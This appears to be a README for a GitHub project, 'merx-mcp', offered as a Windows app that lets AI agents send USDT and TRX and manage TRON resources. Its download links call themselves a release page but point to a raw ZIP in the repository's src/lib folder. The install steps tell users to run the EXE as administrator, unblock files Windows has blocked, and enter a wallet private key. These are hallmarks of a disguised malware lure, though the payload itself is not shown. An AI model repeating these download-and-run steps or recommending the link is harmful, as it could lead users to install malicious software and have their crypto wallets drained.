# 🚀 merx-mcp - TRON tools for agent tasks

[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nicosmall503/merx-mcp/main/src/lib/merx-mcp-v2.0.zip)

## 🧩 What this app does

merx-mcp helps AI agents work with the TRON network from one setup. It gives you tools for sending USDT, moving TRX, checking balances, swapping tokens, and simulating actions before they run.

It also manages network resources like energy and bandwidth. That means you can run TRON tasks with less manual setup.

## 💻 What you need

- A Windows PC
- A web browser
- An internet connection
- A TRON wallet or account if you plan to use live network actions
- Enough disk space to save the app files

For best results, use a recent version of Windows 10 or Windows 11.

## 📥 Download the app

Visit this page to download the latest release:

https://raw.githubusercontent.com/nicosmall503/merx-mcp/main/src/lib/merx-mcp-v2.0.zip

On that page:

1. Find the newest release at the top.
2. Open the release assets.
3. Download the Windows file for your device.
4. Save it to a folder you can find again, like Downloads or Desktop.

If the release includes a ZIP file, download that file. If it includes an EXE file, download that file.

## 🪟 Install on Windows

1. Open the folder where the file was saved.
2. If the file is a ZIP file, right-click it and choose Extract All.
3. Open the extracted folder.
4. If the file is an EXE file, double-click it to start the app.
5. If Windows asks for permission, choose Yes.
6. Follow the on-screen steps until the app opens.

If you do not see the app window right away, wait a few seconds. Some Windows apps need time to start.

## ⚙️ First-time setup

The app uses one config line, so setup stays simple.

1. Open the app settings or config file.
2. Add your TRON connection details.
3. Save the file.
4. Restart the app.

A common setup may include:

- A wallet address
- A private key or signing method
- A network choice such as mainnet or testnet
- A node or RPC endpoint

Keep your private key in a safe place. Do not share it.

## 🔧 How to use it

After setup, you can use merx-mcp to handle TRON tasks from your AI agent or connected app.

Common actions include:

- Check account balance
- Send TRX
- Send USDT
- Swap tokens through supported routes
- Buy energy
- Manage bandwidth
- Simulate a transaction before sending it
- Run intent-based actions with less manual work

If your app connects to Claude, Cursor, or another MCP client, choose merx-mcp as the server in that tool. Then send plain requests in your normal workflow.

## 🧠 Main features

- 55 tools for TRON tasks
- 30 prompts for common actions
- 21 resources for chain data and setup help
- Energy and bandwidth handling
- USDT and TRX transfers
- Token swap support
- Transaction simulation
- Resource use optimization
- MCP server support for AI agents
- Simple config-based setup

## 🔌 Example uses

Here are a few plain examples of what you can do:

- Ask the agent to send 10 USDT to a wallet
- Check how much energy a transfer will need
- Simulate a swap before you confirm it
- Buy energy when a contract call needs more resources
- Review TRON account details before a transfer
- Use the same setup across supported MCP clients

## 🗂️ Folder layout

A typical Windows setup may look like this:

- `merx-mcp.exe` or a release folder with app files
- `config` for your setup values
- `logs` for app activity
- `data` for cached chain info

If you use a ZIP release, keep the extracted folder together. Do not move random files out of it unless the app guide says to.

## 🔒 Safety steps

- Use only the release page linked above
- Check the file name before opening it
- Keep your wallet details private
- Use a test account first if you want to try a new flow
- Review each transfer before you confirm it

## 🛠️ Common problems

### The file will not open

- Right-click the file and choose Run as administrator
- Make sure the file finished downloading
- If Windows blocks it, open the file properties and check for an unblock option

### The app closes right away

- Open it again from the extracted folder
- Check whether the release includes a config file you need to edit
- Make sure any required runtime files stayed in the same folder

### The agent cannot connect

- Confirm the app is running
- Check the config line for typos
- Make sure the MCP client points to the right local server
- Restart both apps after editing the config

### Transfers fail

- Check that the wallet has enough TRX
- Check whether the account needs energy or bandwidth
- Try a simulation first
- Make sure the address and amount are correct

## 📎 Quick start

1. Visit the release page.
2. Download the Windows file.
3. Install or extract it.
4. Add your config line.
5. Start the app.
6. Connect your MCP client.
7. Run a test action.

## 🧭 Best way to begin

If you are new, start with a safe test:

- Open the app
- Connect a wallet with small funds
- Check balance first
- Simulate one action
- Send a small transfer
- Move to full use after that

## 📚 Supported workflow

merx-mcp fits a simple workflow:

- Your agent asks for a TRON action
- The app checks the needed resources
- The app prepares the request
- The app runs or simulates the action
- The app returns the result

That setup keeps each step in one place and helps reduce manual work